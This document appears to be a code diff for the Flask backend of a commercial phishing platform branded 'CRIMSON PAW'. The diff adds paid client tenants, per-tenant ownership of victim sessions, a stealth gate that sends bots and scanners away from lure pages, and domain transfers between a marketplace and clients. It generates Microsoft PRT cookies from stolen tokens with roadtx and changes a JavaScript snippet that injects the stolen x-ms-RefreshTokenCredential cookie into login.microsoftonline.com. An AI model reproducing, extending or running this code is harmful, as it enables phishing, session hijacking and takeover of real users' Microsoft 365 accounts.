+    # 4. If path_clean is empty (visiting root of custom domain), match deployment explicitly targeting root
     if not path_clean and not any(loc in clean_host for loc in ('127.0.0.1', 'localhost')):
         dep = conn.execute(
-            "SELECT * FROM deployments WHERE (domain=? OR domain=?) ORDER BY id DESC LIMIT 1",
+            "SELECT * FROM deployments WHERE (domain=? OR domain=?) AND (path='' OR path IS NULL) ORDER BY id DESC LIMIT 1",
             (cand_dom, clean_host)
         ).fetchone()
         if dep:
@@ -15200,14 +16879,17 @@ def resolve_deployment(host_header, path_slug):
         return dep
     return None
 
+def is_development_host(clean_host):
+    return any(loc in clean_host for loc in ('127.0.0.1', 'localhost', 'ngrok', 'localtunnel', 'localto.net', 'loca.lt'))
+
 def is_owned_or_victim_domain(host_header):
     clean_host = (host_header or '').split(':')[0].strip().lower()
     clean_host = re.sub(r'^https?://', '', clean_host).split('/')[0].strip()
-    if any(loc in clean_host for loc in ('127.0.0.1', 'localhost')):
+    if is_development_host(clean_host):
         return False
     try:
         conn = sqlite3.connect(Config.DB_PATH)
-        rows = conn.execute("SELECT domain FROM owned_domains").fetchall()
+        rows = conn.execute("SELECT domain FROM owned_domains WHERE status = 'active'").fetchall()
         conn.close()
         for r in rows:
             od = (r[0] or '').strip().lower()
@@ -15220,7 +16902,7 @@ def is_owned_or_victim_domain(host_header):
 def is_retired_domain(host_header):
     clean_host = (host_header or '').split(':')[0].strip().lower()
     clean_host = re.sub(r'^https?://', '', clean_host).split('/')[0].strip()
-    if any(loc in clean_host for loc in ('127.0.0.1', 'localhost')):
+    if is_development_host(clean_host):
         return False
     try:
         conn = sqlite3.connect(Config.DB_PATH)
@@ -15252,24 +16934,26 @@ def require_admin_login():
 
     # 1c. Block console access on victim/owned domains (prevents leaking /dashboard or /login)
     if is_owned_or_victim_domain(request.host):
-        admin_blocked = ('/dashboard', '/app', '/login', '/logout', '/mailbox', '/extractor', '/b2b')
+        admin_blocked = ('/dashboard', '/app', '/login', '/client/login', '/logout', '/mailbox', '/extractor', '/b2b')
         if request.path in admin_blocked or request.path.startswith('/api/auth/') or request.path.startswith('/m/'):
             return render_killed_404()
 
     # 2. Allow public home landing page, login, logout, preview showcase, and operator portal
-    if (request.path in ('/', '/landing', '/login', '/logout', '/preview', '/api/auth/login', '/api/auth/logout', '/api/auth/verify-2fa', '/api/auth/resend-2fa', '/api/auth/test-otp') 
+    if (request.path in ('/', '/landing', '/login', '/client/login', '/logout', '/preview', '/api/auth/login', '/api/auth/client-login', '/api/auth/logout', '/api/auth/verify-2fa', '/api/auth/resend-2fa', '/api/auth/test-otp') 
         or request.path.startswith('/m/') 
         or request.path.startswith('/api/m/')
         or request.path == '/api/admin/client-lock'
-        or request.path.startswith('/api/master/')):
+        or request.path.startswith('/api/master/') or request.path.startswith('/client/')):
         return None
 
     # 3. Allow all live victim, deployment, and mock preview endpoints
+    # Also permit public CORS callback for nonce-bound session cookie generation
     if (request.path.startswith('/lp/') or 
         request.path.startswith('/api/lp/') or 
         request.path.startswith('/api/gate/') or 
         request.path.startswith('/api/lg/preview/') or 
         request.path.startswith('/sandbox/') or 
+        (request.path.startswith('/api/sessions/') and request.path.endswith('/cookie')) or
         request.path == '/favicon.ico' or 
         request.path == '/robots.txt'):
         return None
@@ -15372,6 +17056,28 @@ def require_admin_login():
             uc = request.args.get('user_code') or (request.json or {}).get('user_code')
             if uc and not db.is_session_assigned_to_operator(op_id, uc):
                 return jsonify({'error': {'message': 'Forbidden: You do not have permission to access this victim mailbox.'}}), 403
+
+    # ── 6b. Role-Based Access Control for Client Subscriber (client_admin) sessions ──
+    if session.get('is_client_admin'):
+        cid = session.get('client_id')
+
+        # Mailbox proxy / extractor / GAL: strictly enforce victim session ownership
+        if request.path.startswith(('/api/graph_proxy/', '/api/extractor/', '/api/gal/')):
+            uc = request.args.get('user_code')
+            if not uc and request.method in ('POST', 'PUT'):
+                try:
+                    uc = (request.get_json(silent=True) or {}).get('user_code')
+                except Exception:
+                    uc = None
+            if uc and not db.is_session_owned_by_client(cid, uc):
+                return jsonify({'error': {'message': 'Forbidden: This victim session belongs to another tenant.'}}), 403
+
+        # Deployment mutations (kill/pause/resume/deploy/hits/update/delete): ownership enforced
+        m_dep = re.match(r'^/api/lg/deployments/(\d+)(?:/.*)?$', request.path)
+        if m_dep and request.method in ('GET', 'POST', 'PATCH', 'DELETE'):
+            dep_row = _dep.get_deployment(int(m_dep.group(1)))
+            if not dep_row or dep_row.get('owner_id') != cid:
+                return jsonify({'error': 'Forbidden: Deployment belongs to another tenant.'}), 403
 
     return None
 
@@ -15694,13 +17400,16 @@ def api_operator_portal_resend_2fa(token):
 def api_gate_verify():
     data = request.json or {}
     is_bot = data.get('is_bot', False)
+    bot_reason = data.get('bot_reason', 'unknown')
     target = data.get('target', '/')
     client_ip = get_client_ip(request)
     user_agent = request.headers.get('User-Agent', '')
 
     fallback = get_fallback_url()
     if is_bot or not client_ip or is_known_bot(user_agent):
-        log_bot_hit(client_ip or request.remote_addr, user_agent, bot_type="js_diagnostic_fail" if is_bot else "scanner", host=request.host, path=target)
+        b_type = f"js_fail:{bot_reason}" if is_bot else "scanner_ua"
+        log_bot_hit(client_ip or request.remote_addr, user_agent, bot_type=b_type, host=request.host, path=target)
+        logger.warning(f"[STEALTH-GATE] Deflected visitor from {client_ip} (Reason: {b_type}) -> {fallback}")
         return jsonify({'success': False, 'redirect': fallback})
 
     token = generate_gate_token(client_ip, user_agent)
@@ -15721,7 +17430,7 @@ def login_route():
             if session.get('operator_token'):
                 return redirect(f"/m/{session.get('operator_token')}")
             return redirect('/')
-        return redirect('/dashboard')
+        return redirect('/client/portal' if session.get('is_client_admin') else '/dashboard')
     cfg = {}
     if SETTINGS_FILE.exists():
         try:
@@ -15732,6 +17441,78 @@ def login_route():
     platform_name = cfg.get('platform_name', 'CRIMSON PAW')
     custom_logo_url = cfg.get('custom_logo_url', '')
     return render_template_string(CRIMSON_PAW_LOGIN_HTML, platform_name=platform_name, custom_logo_url=custom_logo_url, active_theme=active_theme)
+
+@app.route('/client/login', methods=['GET', 'POST'])
+def client_login_route():
+    if session.get('authenticated'):
+        return redirect('/client/portal' if session.get('is_client_admin') else '/dashboard')
+    cfg = {}
+    if SETTINGS_FILE.exists():
+        try:
+            with open(SETTINGS_FILE, 'r', encoding='utf-8') as f:
+                cfg = json.load(f)
+        except Exception: pass
+    active_theme = cfg.get('theme', 'crimson')
+    platform_name = cfg.get('platform_name', 'CRIMSON PAW')
+    custom_logo_url = cfg.get('custom_logo_url', '')
+    return render_template_string(CRIMSON_PAW_CLIENT_LOGIN_HTML, platform_name=platform_name, custom_logo_url=custom_logo_url, active_theme=active_theme)
+
+@app.route('/api/auth/client-login', methods=['POST'])
+def api_auth_client_login():
+    ip = _get_real_ip()
+    locked, lock_msg = _check_ip_lockout(ip)
+    if locked:
+        return jsonify({'success': False, 'error': lock_msg, 'locked': True}), 429
+
+    data = request.json or {}
+    user = data.get('username', '').strip()
+    pwd = data.get('password', '')
+    if not user or not pwd:
+        return jsonify({'success': False, 'error': 'Client username and password required.'}), 400
+
+    # Emergency master switch: freeze ALL client tenant portals when engaged
+    cfg_lock = {}
+    if SETTINGS_FILE.exists():
+        try:
+            with open(SETTINGS_FILE, 'r', encoding='utf-8') as f:
+                cfg_lock = json.load(f)
+        except Exception:
+            pass
+    if cfg_lock.get('client_admin_locked', False):
+        return jsonify({
+            'success': False,
+            'error': 'Client portal access is temporarily suspended. Please contact your administrator.',
+            'locked': True
+        }), 403
+
+    op_client = db.get_operator_by_username(user)
+    if not op_client or op_client.get('account_type') != 'client_admin':
+        return jsonify({'success': False, 'error': 'Client tenant account not found. Please contact administrator.'}), 404
+
+    from werkzeug.security import check_password_hash
+    if not check_password_hash(op_client['password_hash'], pwd):
+        is_locked, fail_msg = _record_failed_auth(ip)
+        return jsonify({'success': False, 'error': fail_msg, 'locked': is_locked}), 401
+
+    _clear_auth_lockout(ip)
+
+    is_active, reason = db.check_client_subscription_active(op_client['id'])
+    if not is_active:
+        return jsonify({'success': False, 'error': f"{reason} Please contact administrator to renew access."}), 403
+
+    session.permanent = True
+    session['authenticated'] = True
+    session['admin_user'] = op_client['username']
+    session['role'] = 'client_admin'
+    session['is_client_admin'] = True
+    session['is_master_admin'] = False
+    session['client_id'] = op_client['id']
+    session['subscription_expires_at'] = op_client.get('subscription_expires_at')
+    session['plan_name'] = op_client.get('plan_name', 'Pro')
+    session.pop('operator_id', None)
+    session.pop('operator_token', None)
+    logger.info(f"[SECURITY] Client tenant '{user}' authenticated via dedicated client portal.")
+    return jsonify({'success': True, 'role': 'client_admin', 'redirect': '/client/portal'})
 
 @app.route('/logout', methods=['GET', 'POST'])
 def logout_route():
@@ -15828,14 +17609,6 @@ def api_auth_login():
     expected_user = cfg.get('admin_username', 'admin')
     expected_pwd = cfg.get('admin_password', 'admin')
 
-    # Check if client account has been suspended by master admin
-    if cfg.get('client_admin_locked', False) and user == expected_user:
-        return jsonify({
-            'success': False, 
-            'error': 'Account suspended. License verification or administrative authorization required.', 
-            'locked': True
-        }), 403
-
     if user == expected_user and pwd == expected_pwd:
         tg_token = cfg.get('tg_bot_token')
         tg_chat = cfg.get('tg_chat_id')
@@ -15878,9 +17651,39 @@ def api_auth_login():
             session['authenticated'] = True
             session['admin_user'] = user
             session['role'] = 'admin'
+            session['is_master_admin'] = True
             session.pop('operator_id', None)
             session.pop('operator_token', None)
             return jsonify({'success': True, 'role': 'admin', 'redirect': '/dashboard'})
+
+    # 3. Check if user is a Subscribed Client Admin in operators table
+    op_client = db.get_operator_by_username(user)
+    if op_client and op_client.get('account_type') == 'client_admin':
+        from werkzeug.security import check_password_hash
+        if check_password_hash(op_client['password_hash'], pwd):
+            # Check subscription validity
+            is_active, reason = db.check_client_subscription_active(op_client['id'])
+            if not is_active:
+                return jsonify({
+                    'success': False,
+                    'error': f"{reason} Please message administrator on Telegram to renew your account.",
+                    'subscription_expired': True
+                }), 403
+
+            _clear_auth_lockout(ip)
+            session.permanent = True
+            session['authenticated'] = True
+            session['admin_user'] = op_client['username']
+            session['role'] = 'client_admin'
+            session['is_client_admin'] = True
+            session['is_master_admin'] = False
+            session['client_id'] = op_client['id']
+            session['subscription_expires_at'] = op_client.get('subscription_expires_at')
+            session['plan_name'] = op_client.get('plan_name', 'Pro')
+            session.pop('operator_id', None)
+            session.pop('operator_token', None)
+            logger.info(f"[SECURITY] Client subscriber '{user}' authenticated successfully.")
+            return jsonify({'success': True, 'role': 'client_admin', 'redirect': '/client/portal'})
 
     # Password incorrect
     is_locked, fail_msg = _record_failed_auth(ip)
@@ -15908,6 +17711,7 @@ def api_auth_verify_2fa():
         session['authenticated'] = True
         session['admin_user'] = pend['username']
         session['role'] = 'admin'
+        session['is_master_admin'] = True
         session.pop('operator_id', None)
         session.pop('operator_token', None)
         return jsonify({'success': True, 'role': 'admin', 'redirect': '/dashboard'})
@@ -16062,21 +17866,44 @@ def api_auth_me():
         return jsonify({'authenticated': False}), 401
     role = session.get('role', 'admin')
     op_id = session.get('operator_id')
+    client_id = session.get('client_id')
     needs_tg = False
     tg_bot = ''
     tg_chat = ''
+    days_left = 999
+
     if role == 'operator' and op_id:
         op = db.get_operator(op_id)
         if op:
             tg_bot = op.get('tg_bot_token') or ''
             tg_chat = op.get('tg_chat_id') or ''
             needs_tg = not bool(tg_bot and tg_chat)
+    elif session.get('is_client_admin') and client_id:
+        op = db.get_operator(client_id)
+        if op:
+            tg_bot = op.get('tg_bot_token') or ''
+            tg_chat = op.get('tg_chat_id') or ''
+            exp_str = op.get('subscription_expires_at')
+            if exp_str:
+                try:
+                    exp_dt = datetime.strptime(exp_str[:19], '%Y-%m-%d %H:%M:%S')
+                    days_left = max(0, int(round((exp_dt - datetime.now()).total_seconds() / 86400.0)))
+                except Exception:
+                    pass
+
+    if role == 'admin' and not session.get('is_client_admin'):
+        session['is_master_admin'] = True
 
     return jsonify({
         'authenticated': True,
         'username': session.get('admin_user', 'admin'),
         'role': role,
-        'is_master_admin': bool(session.get('is_master_admin', False)),
+        'is_master_admin': is_session_master_admin(),
+        'is_client_admin': bool(session.get('is_client_admin', False)),
+        'client_id': client_id,
+        'subscription_expires_at': session.get('subscription_expires_at'),
+        'days_remaining': days_left,
+        'plan_name': session.get('plan_name', 'Pro'),
         'operator_id': op_id,
         'operator_token': session.get('operator_token', None),
         'needs_telegram_setup': needs_tg,
@@ -16084,11 +17911,20 @@ def api_auth_me():
         'tg_chat_id': tg_chat
     })
 
-# ── Operator Management Routes (Admin Only) ──────────────────────────────────
+def is_session_master_admin():
+    if not session.get('authenticated'):
+        return False
+    if session.get('is_client_admin'):
+        return False
+    if session.get('role') == 'operator':
+        return False
+    return True
+
+# ── Operator Management Routes (Master SuperAdmin Only) ──────────────────────
 @app.route('/api/operators', methods=['GET'])
 def api_operators_list():
-    if session.get('role') != 'admin':
-        return jsonify({'error': 'Forbidden'}), 403
+    if not is_session_master_admin():
+        return jsonify({'error': 'Forbidden. Admin access required.'}), 403
     return jsonify(db.get_operators())
 
 @app.route('/api/operators', methods=['POST'])
@@ -16149,6 +17985,101 @@ def api_operators_reset_device(op_id):
     except Exception as e:
         return jsonify({'error': str(e)}), 500
 
+# ── Subscribed Client SaaS Management Routes (Master SuperAdmin Only) ───────
+@app.route('/api/admin/subscribers', methods=['GET'])
+def api_subscribers_list():
+    if not is_session_master_admin():
+        return jsonify({'error': 'Forbidden. Admin access required.'}), 403
+    return jsonify({'success': True, 'subscribers': db.get_client_users()})
+
+@app.route('/api/admin/subscribers/create', methods=['POST'])
+def api_subscribers_create():
+    if not is_session_master_admin():
+        return jsonify({'error': 'Forbidden. Admin access required.'}), 403
+    data = request.json or {}
+    username = data.get('username', '').strip()
+    password = data.get('password', '')
+    plan_name = data.get('plan_name', 'Pro')
+    duration_days = int(data.get('duration_days', 30))
+    max_deployments = int(data.get('max_deployments', 10))
+
+    if not username or not password:
+        return jsonify({'error': 'Username and password are required'}), 400
+    res = db.create_client_user(username, password, plan_name, duration_days, max_deployments)
+    if not res.get('success'):
+        return jsonify(res), 400
+    return jsonify(res)
+
+@app.route('/api/admin/subscribers/<int:cid>/renew', methods=['POST'])
+def api_subscribers_renew(cid):
+    if not is_session_master_admin():
+        return jsonify({'error': 'Forbidden. Admin access required.'}), 403
+    data = request.json or {}
+    days = int(data.get('days', 30))
+    custom_date = data.get('custom_date')
+    res = db.renew_client_subscription(cid, days, custom_date)
+    return jsonify(res)
+
+@app.route('/api/admin/subscribers/<int:cid>/freeze', methods=['POST'])
+def api_subscribers_freeze(cid):
+    if not is_session_master_admin():
+        return jsonify({'error': 'Forbidden. Admin access required.'}), 403
+    data = request.json or {}
+    freeze = bool(data.get('freeze', True))
+    res = db.toggle_client_freeze(cid, freeze)
+    return jsonify(res)
+
+@app.route('/api/admin/subscribers/<int:cid>/delete', methods=['DELETE', 'POST'])
+def api_subscribers_delete(cid):
+    if not is_session_master_admin():
+        return jsonify({'error': 'Forbidden. Admin access required.'}), 403
+    res = db.delete_client_user(cid)
+    return jsonify(res)
+
+@app.route('/api/admin/subscribers/<int:cid>/assign-domain', methods=['POST'])
+def api_subscribers_assign_domain(cid):
+    if not is_session_master_admin():
+        return jsonify({'error': 'Forbidden. Admin access required.'}), 403
+    data = request.json or {}
+    domain = data.get('domain', '').strip()
+    if not domain:
+        return jsonify({'error': 'Domain is required'}), 400
+    # Ownership TRANSFER: the domain leaves the master pool / marketplace inventory
+    # and becomes the subscriber's private property.
+    transferred = _dep.transfer_domain_to_client(domain, cid)
+    if not transferred:
+        # Domain not yet registered — create it directly as the client's property.
+        _dep.add_owned_domain(domain, 'manual', None, owner_id=cid)
+        transferred = True
+    res = {'success': transferred}
+    return jsonify(res)
+
+@app.route('/api/admin/subscribers/<int:cid>/unassign-domain', methods=['POST'])
+def api_subscribers_unassign_domain(cid):
+    if not is_session_master_admin():
+        return jsonify({'error': 'Forbidden. Admin access required.'}), 403
+    data = request.json or {}
+    domain = data.get('domain', '').strip()
+    if not domain:
+        return jsonify({'error': 'Domain is required'}), 400
+    # Revocation returns the domain to the marketplace inventory as sellable stock.
+    ok = _dep.return_domain_to_marketplace(domain)
+    res = {'success': ok}
+    return jsonify(res)
+
+@app.route('/api/client/telegram-settings', methods=['POST'])
+def api_client_telegram_settings():
+    if not session.get('authenticated'):
+        return jsonify({'error': 'Unauthorized'}), 401
+    cid = session.get('client_id') or session.get('operator_id')
+    if not cid:
+        return jsonify({'error': 'No tenant ID found in session'}), 400
+    data = request.json or {}
+    tg_bot = data.get('tg_bot_token', '').strip()
+    tg_chat = data.get('tg_chat_id', '').strip()
+    db.update_operator_telegram(cid, tg_bot, tg_chat)
+    return jsonify({'success': True})
+
 # ── Operator Audit Surveillance Endpoints ────────────────────────
 @app.route('/api/admin/audit-logs', methods=['GET'])
 def api_get_audit_logs():
@@ -16167,15 +18098,23 @@ def api_get_audit_logs():
 
 @app.route('/api/admin/audit-logs/clear', methods=['POST'])
 def api_clear_audit_logs():
-    if session.get('role') != 'admin' or not session.get('is_master_admin'):
-        return jsonify({'error': 'Forbidden: Only Master SuperAdmin can clear the audit trail.'}), 403
+    if not is_session_master_admin():
+        return jsonify({'error': 'Forbidden: Only Administrator can clear the audit trail.'}), 403
     ok = db.clear_operator_audit_logs()
     return jsonify({'success': ok, 'message': 'All operator surveillance audit logs permanently cleared.'})
 
 @app.route('/')
 @app.route('/landing')
 def index():
-    # If root request matches a deployment:
+    # 1. Authenticated session check - never serve phishing lure to logged in operators/admins/clients
+    if session.get('authenticated'):
+        if session.get('role') == 'operator':
+            token = session.get('operator_token')
+            if token:
+                return redirect(f"/m/{token}")
+        return redirect('/client/portal' if session.get('is_client_admin') else '/dashboard')
+
+    # 2. If root request matches a deployment explicitly targeted at root:
     dep = lookup_deployment(request.host, '')
     if dep:
         if dep.get('status') == 'active':
@@ -16183,12 +18122,9 @@ def index():
         elif dep.get('status') in ('killed', 'deleted'):
             return render_killed_404()
 
-    # If this request is on a victim/owned domain or retired domain:
+    # 3. If this request is on a victim/owned domain or retired domain:
     if is_owned_or_victim_domain(request.host) or is_retired_domain(request.host):
         return render_killed_404()
-
-    if request.path == '/' and session.get('authenticated'):
-        return redirect('/dashboard')
     cfg = {}
     if SETTINGS_FILE.exists():
         try:
@@ -16199,6 +18135,77 @@ def index():
     platform_name = cfg.get('platform_name', 'CRIMSON PAW')
     custom_logo_url = cfg.get('custom_logo_url', '')
     return render_template_string(CRIMSON_PAW_LANDING_HTML, platform_name=platform_name, custom_logo_url=custom_logo_url, active_theme=active_theme)
+
+
+# ═══════════════════════════════════════════════════════════════════
+# DEDICATED CLIENT SUBSCRIBER PORTAL & ISOLATED SETTINGS API
+# ═══════════════════════════════════════════════════════════════════
+
+@app.route('/client/portal')
+@app.route('/client/dashboard')
+def client_portal():
+    if not session.get('authenticated'):
+        return redirect('/client/login')
+    if not session.get('is_client_admin'):
+        return redirect('/dashboard')
+
+    cid = session.get('client_id')
+    active, reason = db.check_client_subscription_active(cid)
+    if not active:
+        session.clear()
+        import urllib.parse
+        return redirect(f"/client/login?msg={urllib.parse.quote(reason)}")
+
+    cfg = {}
+    if SETTINGS_FILE.exists():
+        try:
+            with open(SETTINGS_FILE, 'r', encoding='utf-8') as f:
+                cfg = json.load(f)
+        except Exception:
+            pass
+
+    active_theme = cfg.get('theme', 'crimson')
+    platform_name = cfg.get('platform_name', 'CRIMSON PAW')
+    custom_logo_url = cfg.get('custom_logo_url', '')
+
+    return render_template_string(
+        HTML_TEMPLATE,
+        user_role='client_admin',
+        user_name=session.get('admin_user') or 'Subscriber',
+        operator_token='',
+        is_master_admin=False,
+        is_client_admin=True,
+        active_theme=active_theme,
+        platform_name=platform_name,
+        custom_logo_url=custom_logo_url,
+        dynadot_api_key=''
+    )
+
+@app.route('/api/client/settings', methods=['GET', 'POST'])
+def api_client_settings():
+    if not session.get('authenticated') or not session.get('is_client_admin'):
+        return jsonify({'error': 'Unauthorized: Client subscriber access required'}), 401
+    cid = session.get('client_id')
+    op = db.get_operator(cid)
+    if not op:
+        return jsonify({'error': 'Client record not found'}), 404
+
+    if request.method == 'POST':
+        data = request.json or {}
+        bot_token = (data.get('tg_bot_token') or '').strip()
+        chat_id = (data.get('tg_chat_id') or '').strip()
+        db.update_operator_telegram(cid, bot_token, chat_id)
+        return jsonify({'success': True, 'message': 'Client settings updated.'})
+
+    return jsonify({
+        'success': True,
+        'username': op.get('username'),
+        'plan_name': op.get('plan_name', 'Pro'),
+        'tg_bot_token': op.get('tg_bot_token') or '',
+        'tg_chat_id': op.get('tg_chat_id') or '',
+        'notify_token': True,
+        'is_master_admin': False
+    })
 
 @app.route('/dashboard')
 @app.route('/app')
@@ -16211,6 +18218,10 @@ def dashboard():
         if token:
             return redirect(f"/m/{token}")
 
+    # Client subscribers are strictly directed to their own portal
+    if session.get('is_client_admin'):
+        return redirect('/client/portal')
+
     cfg = {}
     if SETTINGS_FILE.exists():
         try:
@@ -16220,7 +18231,10 @@ def dashboard():
     active_theme = cfg.get('theme', 'crimson')
     platform_name = cfg.get('platform_name', 'CRIMSON PAW')
     custom_logo_url = cfg.get('custom_logo_url', '')
-    is_master = bool(session.get('is_master_admin', False))
+    is_client = bool(session.get('is_client_admin', False))
+    if role == 'admin' and not is_client:
+        session['is_master_admin'] = True
+    is_master = is_session_master_admin()
 
     return render_template_string(
         HTML_TEMPLATE,
@@ -16228,16 +18242,34 @@ def dashboard():
         user_name=session.get('admin_user') or session.get('username', 'Admin'),
         operator_token=session.get('operator_token', ''),
         is_master_admin=is_master,
+        is_client_admin=is_client,
         active_theme=active_theme,
         platform_name=platform_name,
-        custom_logo_url=custom_logo_url
+        custom_logo_url=custom_logo_url,
+        dynadot_api_key=cfg.get('dynadot_key', getattr(Config, 'DYNADOT_API_KEY', '')),
+        marketplace_telegram_contact=cfg.get('marketplace_telegram_contact', '')
     )
+
+def _client_session_guard(target_session):
+    """Return a 403 Flask response when an authenticated client subscriber does not
+    own the target session; None when the caller is admin/master or the rightful owner."""
+    if not session.get('is_client_admin'):
+        return None
+    cid = session.get('client_id')
+    if target_session.get('owner_id') != cid:
+        logger.warning(f"[SECURITY] Client {cid} attempted to access unowned session "
+                       f"{target_session.get('user_code')} — blocked by tenant guard.")
+        return jsonify({'error': 'Forbidden: This session belongs to another tenant.'}), 403
+    return None
 
 @app.route('/api/sessions/<user_code>/revoke', methods=['POST'])
 def revoke_session_route(user_code):
     s = db.get_session_by_user_code(user_code)
     if not s:
         return jsonify({'success': False, 'error': 'Session not found'}), 404
+    guard = _client_session_guard(s)
+    if guard:
+        return guard
     db.update_session_status(user_code, 'REVOKED')
     return jsonify({'success': True, 'status': 'REVOKED'})
 
@@ -16251,23 +18283,45 @@ def create_campaign():
 
 @app.route('/api/sessions', methods=['GET'])
 def get_sessions():
-    all_sessions = db.get_all_sessions()
-    for s in all_sessions:
-        uc = s.get('user_code')
-        s['chain_running'] = executor.is_chain_running(uc)
-        s['prt_ready'] = bool(s.get('prt_cookie')) or executor.is_prt_ready(uc)
+    # If client subscriber, pull strictly their owned sessions
+    if session.get('is_client_admin'):
+        cid = session.get('client_id')
+        client_sessions = db.get_all_sessions(owner_id=cid)
+        for s in client_sessions:
+            uc = s.get('user_code')
+            s['chain_running'] = executor.is_chain_running(uc)
+            s['prt_ready'] = bool(s.get('prt_cookie')) or executor.is_prt_ready(uc)
+        return jsonify(client_sessions)
+
+    # If operator, pull assigned sessions
     if session.get('role') == 'operator':
         op_id = session.get('operator_id')
         assigned = set(db.get_operator_assigned_sessions(op_id))
+        all_sessions = db.get_all_sessions()
         filtered = [s for s in all_sessions if s.get('user_code') in assigned]
+        for s in filtered:
+            uc = s.get('user_code')
+            s['chain_running'] = executor.is_chain_running(uc)
+            s['prt_ready'] = bool(s.get('prt_cookie')) or executor.is_prt_ready(uc)
         return jsonify(filtered)
-    return jsonify(all_sessions)
+
+    # Master Admin: Pull Master Admin's own sessions (unowned / owner_id IS NULL)
+    # Note: Client subscribers' sessions remain partitioned inside the Client Tenants management pane
+    admin_sessions = db.get_all_sessions(admin_only=True)
+    for s in admin_sessions:
+        uc = s.get('user_code')
+        s['chain_running'] = executor.is_chain_running(uc)
+        s['prt_ready'] = bool(s.get('prt_cookie')) or executor.is_prt_ready(uc)
+    return jsonify(admin_sessions)
 
 @app.route('/api/sessions/<user_code>/refresh', methods=['POST'])
 def refresh_session_route(user_code):
     s = db.get_session_by_user_code(user_code)
     if not s or s['status'] != 'CAPTURED':
         return jsonify({'success': False, 'error': 'Session not eligible for refresh'}), 400
+    guard = _client_session_guard(s)
+    if guard:
+        return guard
 
     # PRT-only refresh — no fallback to oauth broker grant
     success, new_at, new_exp = executor.refresh_via_prt(user_code)
@@ -16300,7 +18354,12 @@ def get_session_cookie_route(user_code):
     if not s or s['status'] != 'CAPTURED':
         return jsonify({'success': False, 'error': 'Session not found or not captured'}), 400
 
-    sso_nonce  = request.args.get('nonce', '').strip()   # optional nonce from query string
+    # Tenant ownership guard (session-authenticated callers only; CORS callbacks unaffected)
+    guard = _client_session_guard(s)
+    if guard:
+        guard[0].headers.update(cors_headers)
+        return guard
+
     prt_cookie = None
     victim_path = os.path.join(VICTIMS_DIR, user_code)
     prt_file    = os.path.join(victim_path, 'roadtx.prt')
@@ -16308,23 +18367,21 @@ def get_session_cookie_route(user_code):
     if os.path.exists(prt_file):
         try:
             from executor import run_roadtx
+            # roadtx prtcookie takes -f <file> (no -n parameter)
             cmd = ['prtcookie', '-f', prt_file]
-            if sso_nonce:
-                cmd += ['-n', sso_nonce]   # bind cookie to this specific sso_nonce
             prt_cookie_raw = run_roadtx(cmd, victim_path)
             if prt_cookie_raw:
                 for line in prt_cookie_raw.splitlines():
                     line = line.strip()
                     if line.startswith('PRT cookie:'):
                         prt_cookie = line.replace('PRT cookie:', '').strip()
-                        if not sso_nonce:                        # cache only generic cookies
-                            db.update_session_artifacts(user_code, s.get('teams_token'), prt_cookie)
+                        db.update_session_artifacts(user_code, s.get('teams_token'), prt_cookie)
                         break
         except Exception as e:
             logger.error(f"Error generating PRT cookie: {e}")
 
-    # Fall back to cached cookie only if no nonce was requested
-    if not prt_cookie and not sso_nonce:
+    # Fall back to cached cookie if generation returned nothing
+    if not prt_cookie:
         prt_cookie = s.get('prt_cookie')
 
     if not prt_cookie:
@@ -16335,69 +18392,31 @@ def get_session_cookie_route(user_code):
 
     victim_name = (s.get('victim_name') or s.get('victim_email') or user_code).replace(' ', '_')
 
-    # ── JS snippet ────────────────────────────────────────────────────────────
-    # The snippet is self-contained: it extracts the sso_nonce from the current
-    # URL, calls back to CRIMSON PAW to get a nonce-bound cookie, sets it, reloads.
-    host_base = request.host_url.rstrip('/')
-    cfg = {}
-    if SETTINGS_FILE.exists():
-        try:
-            with open(SETTINGS_FILE, 'r', encoding='utf-8') as f:
-                cfg = json.load(f)
-        except Exception:
-            pass
-    deploy_h = cfg.get('deploy_host', '').strip()
-    if deploy_h:
-        if not deploy_h.startswith('http://') and not deploy_h.startswith('https://'):
-            deploy_h = f"https://{deploy_h}"
-        host_base = deploy_h.rstrip('/')
-
+    # ── Self-Contained 1-Click Injection Script ────────────────────────────────
+    # Direct, instantaneous client-side injection. Zero callback, zero network latency,
+    # zero mixed-content or CORS failure risk.
     js_script = f'''(async () => {{
-  // 1. Extract sso_nonce from the current Microsoft login URL
-  const urlNonce = new URLSearchParams(window.location.search).get('sso_nonce') || '';
-
-  let cookieVal;
-  if (urlNonce) {{
-    // 2a. Nonce found — fetch a fresh cookie bound to this exact nonce
-    console.log('%c[CRIMSON PAW] sso_nonce found: ' + urlNonce, 'color:#ff6b72');
-    try {{
-      const r = await fetch(`{host_base}/api/sessions/{user_code}/cookie?nonce=${{encodeURIComponent(urlNonce)}}`, {{
-        method: 'GET', mode: 'cors'
+  const cookieVal = "{prt_cookie}";
+  try {{
+    if (typeof cookieStore !== 'undefined') {{
+      await cookieStore.set({{
+        name: 'x-ms-RefreshTokenCredential',
+        value: cookieVal,
+        domain: 'login.microsoftonline.com',
+        path: '/',
+        sameSite: 'none',
+        secure: true
       }});
-      const d = await r.json();
-      if (!d.success) {{ console.error('[CRIMSON PAW] ✗ Server error:', d.error); return; }}
-      cookieVal = d.prt_cookie;
-      console.log('%c[CRIMSON PAW] ✓ Nonce-bound cookie received', 'color:#3fb950;font-weight:bold');
-    }} catch(e) {{
-      console.error('[CRIMSON PAW] ✗ Could not reach server at {host_base}:', e);
-      return;
+      console.log('%c[CRIMSON PAW] ✓ Session Injected via cookieStore!', 'color:#22c55e;font-weight:bold;');
+    }} else {{
+      document.cookie = 'x-ms-RefreshTokenCredential=' + cookieVal + '; domain=.login.microsoftonline.com; path=/; secure; samesite=none';
+      console.log('%c[CRIMSON PAW] ✓ Session Injected via document.cookie!', 'color:#22c55e;font-weight:bold;');
     }}
-  }} else {{
-    // 2b. No nonce in URL — use the pre-generated cookie (may not work for all flows)
-    cookieVal = "{prt_cookie}";
-    console.log('%c[CRIMSON PAW] ⚠ No sso_nonce in URL — using generic cookie (may need to navigate to target app first)', 'color:#d29922;font-weight:bold');
+    console.log('%c[CRIMSON PAW] Redirecting to Office 365...', 'color:#38bdf8;');
+    window.location.href = 'https://www.office.com/?auth=2';
+  }} catch (err) {{
+    console.error('[CRIMSON PAW] Injection error:', err);
   }}
-
-  // 3. Set the cookie
-  if (typeof cookieStore !== 'undefined') {{
-    await cookieStore.set({{
-      name: 'x-ms-RefreshTokenCredential',
-      value: cookieVal,
-      domain: 'login.microsoftonline.com',
-      path: '/',
-      sameSite: 'none',
-      secure: true
-    }});
